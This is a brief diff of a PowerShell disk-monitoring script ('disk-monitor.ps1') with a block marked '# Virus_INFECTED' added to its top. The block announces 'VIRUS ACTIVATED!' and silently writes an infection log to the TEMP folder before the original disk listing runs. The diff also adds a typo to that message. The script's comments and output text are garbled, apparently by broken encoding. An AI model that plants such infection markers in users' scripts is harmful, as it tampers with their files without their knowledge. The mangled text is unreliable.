@@ -1,5 +1,5 @@
 # Virus_INFECTED
-Write-Host "VIRUS ACTIVATED!" -ForegroundColor Red
+Write-Host "VIRUS ACTIVATEDi!" -ForegroundColor Red
 try {
     $InfectionMarker = "INFECTED"
     Set-Content -Path "$env:TEMP\virus_log.txt" -Value "File infected: disk-monitor.ps1" -ErrorAction SilentlyContinue
@@ -8,10 +8,6 @@ try {
 }
 
 # Original file content:
-
-
-# Original file content:
-# ������ ��� ����������� ��������� ������������
 Write-Host "=== ���������� ������ ===" -ForegroundColor Green
 
 Get-WmiObject -Class Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object {
